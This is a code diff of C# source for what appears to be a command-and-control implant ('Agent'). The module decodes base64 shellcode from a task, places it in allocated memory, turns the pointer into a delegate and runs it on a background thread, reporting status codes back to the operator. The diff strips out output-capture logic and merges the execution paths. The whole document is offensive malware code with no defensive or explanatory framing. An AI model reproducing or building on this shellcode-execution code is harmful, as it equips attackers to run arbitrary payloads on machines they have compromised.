@@ -56,30 +56,6 @@ namespace Agent
                 return;
             }
 
-            if (messageManager.StdIsBusy() && args.output)
-            {
-                await messageManager.AddResponse(new ResponseResult()
-                {
-                    completed = true,
-                    process_response = new Dictionary<string, string> { { "message", "0x20" } },
-                    task_id = job.task.id,
-                    status = "success"
-                });
-                return;
-            }
-
-            if (!messageManager.CaptureStdOut(job.task.id) && args.output)
-            {
-                await messageManager.AddResponse(new ResponseResult()
-                {
-                    completed = true,
-                    process_response = new Dictionary<string, string> { { "message", "0x20" } },
-                    task_id = job.task.id,
-                    status = "success"
-                });
-                return;
-            }
-
             byte[] buffer = Convert.FromBase64String(args.asm);
 
             //Allocate shellcode as RW
@@ -114,75 +90,22 @@ namespace Agent
 
             // Create a delegate to the shellcode
             BufferDelegate shellcodeDelegate = (BufferDelegate)Marshal.GetDelegateForFunctionPointer(bufAddr, typeof(BufferDelegate));
-
-            if (args.output)
-            {
-                output_task_id = job.task.id;
-#pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
-                Task.Run(() =>
+            Task t = Task.Run(() => {
+                try
                 {
-                    using(var redirector = new ConsoleWriter())
+                    shellcodeDelegate.Invoke();
+                }
+                catch
+                {
+                    messageManager.AddResponse(new ResponseResult()
                     {
-                        redirector.WriteLineEvent += Redirector_WriteLineEvent;
-                        redirector.WriteEvent += Redirector_WriteEvent;
-                        try
-                        {
-                            shellcodeDelegate.Invoke();
-                            messageManager.AddResponse(new ResponseResult()
-                            {
-                                completed = false,
-                                process_response = new Dictionary<string, string> { { "message", "0x44" } },
-                                task_id = job.task.id,
-                                status = "success"
-                            });
-                        }
-                        catch
-                        {
-                            messageManager.AddResponse(new ResponseResult()
-                            {
-                                completed = false,
-                                process_response = new Dictionary<string, string> { { "message", "0x44" } },
-                                task_id = job.task.id,
-                                status = "error"
-                            });
-                        }
-                        redirector.WriteLineEvent -= Redirector_WriteLineEvent;
-                        redirector.WriteEvent -= Redirector_WriteEvent;
-                        messageManager.ReleaseStdOut();
-
-                    }
-                    output_task_id = String.Empty;
-                });
-#pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
-            }
-            else {
-                //Run withotu catching output
-#pragma warning disable CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
-                Task.Run(() => {
-                    try
-                    {
-                        shellcodeDelegate.Invoke();
-                        messageManager.AddResponse(new ResponseResult()
-                        {
-                            completed = false,
-                            process_response = new Dictionary<string, string> { { "message", "0x44" } },
-                            task_id = job.task.id,
-                            status = "success"
-                        });
-                    }
-                    catch
-                    {
-                        messageManager.AddResponse(new ResponseResult()
-                        {
-                            completed = false,
-                            process_response = new Dictionary<string, string> { { "message", "0x44" } },
-                            task_id = job.task.id,
-                            status = "error"
-                        });
-                    }
-                });
-#pragma warning restore CS4014 // Because this call is not awaited, execution of the current method continues before the call is completed
-            }
+                        completed = false,
+                        process_response = new Dictionary<string, string> { { "message", "0x44" } },
+                        task_id = job.task.id,
+                        status = "error"
+                    });
+                }
+            });
         }
 
         private void Redirector_WriteEvent(object? sender, ConsoleWriterEventArgs e)
